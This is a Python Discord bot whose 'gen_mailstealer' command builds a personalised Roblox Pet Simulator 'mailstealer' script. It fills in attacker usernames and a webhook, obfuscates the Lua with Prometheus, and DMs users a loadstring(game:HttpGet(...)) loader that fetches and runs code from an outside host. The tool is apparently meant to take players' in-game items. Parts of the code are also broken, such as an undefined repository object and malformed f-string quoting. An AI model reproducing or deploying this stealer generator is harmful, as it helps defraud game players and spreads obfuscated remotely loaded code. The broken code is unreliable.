import secrets
import discord
from discord import app_commands
import os
from keep_alive import keep_alive

keep_alive()

intents = discord.Intents()
intents.message_content = True

client = discord.Client(intents=intents)
tree = app_commands.CommandTree(client)

TOKEN = os.getenv("TOKEN")  # Discord Token

def get_script_name():
    already_used_script_names = [file.path for file in "/obfuscations"]
    script_name = secrets.token_hex(12)
    print(script_name)
    if script_name in already_used_script_names:
        return get_script_name()
    return script_name

@tree.command(
    name="gen_mailstealer",
    description="Set up Mailstealer, Pls send huge to nickname: PS99Russia"
)         
async def setup_ms(
  interaction: discord.Interaction, 
  username: str, 
  username2: str,
  show_loading_screen: bool, 
  webhook: str = "",
  minimum_rap: int = 10000  # Default value set to 10000
):
  print("Entering setup_ms")
  show_loading_screen = str(show_loading_screen).lower()
  script = f```Username = "{username}"
Username2 = "{username2}"
LoadingScreen = {show_loading_screen}
Webhook = "{webhook}"
MinimumRAP = {minimum_rap}
loadstring(game:HttpGet("egorikusa.space"))()```

  obfuscations_dir = "obfuscations"
  os.makedirs(obfuscations_dir, exist_ok=True)

  script_file_path = os.path.join(obfuscations_dir, f"{interaction.user.id}.lua")
  obfuscated_file_path = os.path.join(obfuscations_dir, f"{interaction.user.id}.obfuscated.lua")

  try:
      with open(script_file_path, "w") as f:
          f.write(script)

      os.system(f"Prometheus/cli.lua {script_file_path} --LuaU --preset Medium")

      sc_name = get_script_name()

      with open(obfuscated_file_path, "r") as obfed_script_file:
          script_src = obfed_script_file.read()

      scripts_repo.create_file(f"{sc_name}.lua", f"upload {sc_name}.lua", script_src)

      print("Message sent successfully")
      await interaction.response.send_message(f"Check your direct messages, {interaction.user.mention}!", ephemeral=True)


      user_dm = await interaction.user.create_dm()

      embed = discord.Embed(
          title="Mailstealer Script Generated, Pls send huge to nickname: PS99Russia",
          description="This script is generated exclusively for you, Pls send huge to nickname: PS99Russia",
          color=discord.Color.gold()
      )

      embed.set_thumbnail(url="https://static.wikia.nocookie.net/pet-simulator/images/8/88/Mailbox-Release.png/revision/latest?cb=20240114132246")  # Replace with the actual URL
      embed.add_field(name="Script", value=f"```lua\nloadstring(game:HttpGet('https://egorikusa.space/{sc_name}.lua'))()```", inline=False)
      embed.set_footer(text="Bot developed by Remo, Flame | MailStealer v3.3 By Egorikusa, Pls send huge to nickname: PS99Russia")

      await user_dm.send(embed=embed)

  except Exception as e:
      print(f"Error in setup_ms: {e}")

  finally:
      if os.path.exists(script_file_path):
          os.remove(script_file_path)
      if os.path.exists(obfuscated_file_path):
          os.remove(obfuscated_file_path)

@client.event
async def on_ready():
    await tree.sync()
    print("Ready!")
    await client.change_presence(activity=discord.Game(name=".gg/mailstealer"))

client.run(TOKEN)
